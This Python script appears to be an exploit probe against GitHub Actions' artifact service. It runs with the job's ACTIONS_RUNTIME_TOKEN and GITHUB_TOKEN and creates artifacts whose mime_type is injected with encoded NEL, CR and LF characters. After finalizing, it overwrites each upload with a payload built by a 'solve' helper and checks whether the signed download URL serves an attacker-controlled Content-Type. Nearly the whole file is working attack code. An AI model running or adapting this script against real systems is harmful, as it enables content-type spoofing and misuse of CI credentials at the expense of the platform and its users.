import os, uuid, urllib.request, urllib.error, urllib.parse
import solve

run_id, job_id = solve.backend_ids(os.environ['ACTIONS_RUNTIME_TOKEN'])
common = {'workflow_run_backend_id':run_id,'workflow_job_run_backend_id':job_id}
repo=os.environ['GITHUB_REPOSITORY']
secret=os.environ['GITHUB_TOKEN']
candidates=[
 ('pct85_prefix','%85application/json'),
 ('pct85_suffix','application/json%85'),
 ('pctC285_prefix','%C2%85application/json'),
 ('pctC285_suffix','application/json%C2%85'),
 ('pctu0085_prefix','%u0085application/json'),
 ('pctu0085_suffix','application/json%u0085'),
 ('pct2585_prefix','%2585application/json'),
 ('pct2585_suffix','application/json%2585'),
 ('encoded_cr_prefix','%0Dapplication/json'),
 ('encoded_lf_suffix','application/json%0A'),
]
class Stop(urllib.request.HTTPRedirectHandler):
 def redirect_request(self,*args): return None
opener=urllib.request.build_opener(Stop)
for label,mime in candidates:
 name='probe-'+uuid.uuid4().hex[:10]+'.json'
 try:
  created=solve.twirp('CreateArtifact',{**common,'name':name,'version':7,'mime_type':mime})
 except urllib.error.HTTPError as error:
  print(label,'create_http',error.code,flush=True); continue
 except Exception as error:
  print(label,'create_error',type(error).__name__,str(error)[:80],flush=True); continue
 try:
  url=created['signed_upload_url']
  solve.put_blob(url,b'{}')
  final=solve.finalize_artifact(common,name,b'{}')
  artifact_id=str(final['artifact_id'])
  body=solve.payload(repo,artifact_id)
  solve.put_blob(url,body)
  api='https://api.github.com/repos/'+repo+'/actions/artifacts/'+artifact_id+'/zip'
  req=urllib.request.Request(api,headers={'Authorization':'Bearer '+secret})
  try: response=opener.open(req,timeout=15)
  except urllib.error.HTTPError as error: response=error
  location=response.headers.get('Location','')
  query=urllib.parse.parse_qs(urllib.parse.urlsplit(location).query)
  rsct=query.get('rsct',[''])[0]
  with urllib.request.urlopen(urllib.request.Request(location,method='HEAD'),timeout=15) as blob_response:
   actual_content_type=blob_response.headers.get('Content-Type')
  print(label,'artifact_id',artifact_id,'rsct',repr(rsct),'actual_ct',repr(actual_content_type),'sha256',__import__('hashlib').sha256(body).hexdigest(),flush=True)
 except Exception as error:
  print(label,'after_create_error',type(error).__name__,str(error)[:80],flush=True)
